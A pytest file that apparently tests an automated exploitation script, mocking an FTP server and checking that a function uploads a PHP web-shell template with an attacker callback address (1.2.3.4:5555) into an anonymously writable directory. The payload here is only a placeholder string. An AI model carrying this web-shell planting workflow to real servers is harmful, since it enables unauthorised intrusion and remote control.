import os
import sys
import tempfile
import importlib.util
import types
from unittest import mock

SCRIPT_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'utils', 'auto-exploit.py'))
spec = importlib.util.spec_from_file_location('auto_exploit', SCRIPT_PATH)
auto_exploit = importlib.util.module_from_spec(spec)
dummy_impacket = types.ModuleType('impacket')
dummy_smbconnection = types.ModuleType('impacket.smbconnection')
dummy_smbconnection.SMBConnection = object
sys.modules['impacket'] = dummy_impacket
sys.modules['impacket.smbconnection'] = dummy_smbconnection
spec.loader.exec_module(auto_exploit)
upload_ftp_shell = auto_exploit.upload_ftp_shell

class DummyFTP:
    def __init__(self):
        self.cwd_called = []
        self.stored = []
    def connect(self, ip, port, timeout=5):
        pass
    def login(self):
        pass
    def cwd(self, path):
        self.cwd_called.append(path)
    def storbinary(self, cmd, fp):
        self.stored.append((cmd, fp.read()))
    def quit(self):
        pass

def test_upload_ftp_shell_uses_bytesio(tmp_path, monkeypatch):
    ftp_instance = DummyFTP()
    monkeypatch.setattr('ftplib.FTP', lambda: ftp_instance)

    ftp_loot = {'anonymous_login': True, 'writable_dirs': ['uploads']}
    callback = '1.2.3.4:5555'

    payload_dir = os.path.join('payloads', 'web')
    os.makedirs(payload_dir, exist_ok=True)
    with tempfile.NamedTemporaryFile(dir=payload_dir, suffix='.php', delete=False) as tmp:
        tmp.write(b'CONNECT {{CALLBACK}}')
        temp_name = tmp.name

    try:
        upload_ftp_shell(ftp_loot, '127.0.0.1', callback)
    finally:
        os.unlink(temp_name)

    assert ftp_instance.cwd_called.count('uploads') == 1
    assert ftp_instance.cwd_called.count('..') == 1
    assert ftp_instance.stored
    assert any(b'1.2.3.4:5555' in data for _, data in ftp_instance.stored)
